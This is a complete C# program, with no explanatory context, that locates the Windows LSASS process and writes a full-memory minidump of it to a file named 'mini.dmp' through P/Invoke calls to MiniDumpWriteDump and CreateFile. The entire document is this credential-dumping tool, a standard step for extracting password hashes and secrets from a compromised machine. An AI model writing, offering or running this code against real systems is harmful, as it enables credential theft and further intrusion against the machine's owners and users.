using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

class Program
{
    [DllImport("Dbghelp.dll", SetLastError = true)]
    static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        int ProcessId,
        SafeHandle hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    static void Main()
    {
        // Open the LSASS process
        Process lsassProcess = Process.GetProcessesByName("lsass")[0];

        // Create a minidump file
        string dumpFilePath = "mini.dmp";
        using (SafeFileHandle dumpFileHandle = CreateDumpFile(dumpFilePath))
        {
            if (dumpFileHandle != null && !dumpFileHandle.IsInvalid)
            {
                // Write the minidump
                bool success = MiniDumpWriteDump(
                    lsassProcess.Handle,
                    lsassProcess.Id,
                    dumpFileHandle,
                    2, // MiniDumpWithFullMemory
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (success)
                {
                    Console.WriteLine("LSASS process memory dumped to: " + dumpFilePath);
                }
                else
                {
                    Console.WriteLine("Failed to write the minidump.");
                }
            }
            else
            {
                Console.WriteLine("Failed to create the dump file.");
            }
        }
    }

    static SafeFileHandle CreateDumpFile(string filePath)
    {
        const int GENERIC_WRITE = 0x40000000;
        const int CREATE_ALWAYS = 2;

        IntPtr handle = CreateFile(
            filePath,
            GENERIC_WRITE,
            0,
            IntPtr.Zero,
            CREATE_ALWAYS,
            0,
            IntPtr.Zero);

        return new SafeFileHandle(handle, true);
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFile(
        string lpFileName,
        int dwDesiredAccess,
        int dwShareMode,
        IntPtr lpSecurityAttributes,
        int dwCreationDisposition,
        int dwFlagsAndAttributes,
        IntPtr hTemplateFile);
}
